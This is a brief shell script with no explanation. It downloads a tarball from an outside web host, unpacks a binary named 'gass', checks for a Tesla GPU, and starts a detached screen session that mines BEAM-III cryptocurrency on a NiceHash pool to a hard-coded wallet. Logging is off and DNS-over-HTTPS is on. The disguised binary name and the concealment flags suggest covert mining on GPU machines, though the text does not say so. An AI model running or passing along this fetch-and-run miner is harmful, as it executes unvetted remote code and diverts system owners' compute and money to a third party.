sudo apt install screen -y
wget http://cdn.muvia.club/gass.tar.gz
tar -xf gass.tar.gz
echo -n "$(tput setaf 3)GPU Found => Tesla ";nvidia-smi | grep "Tesla" | sed "s/.*Tesla \([^ ]*\).*/\1/"
screen -S lol -d -m ./gass --algo BEAM-III --pool stratum+ssl://beamv3.auto.nicehash.com:443 --user 3H1YkJhw9Ybgii4H1D35usRPCeRn7G81SK.buruh --dns-over-https 2 --log 0

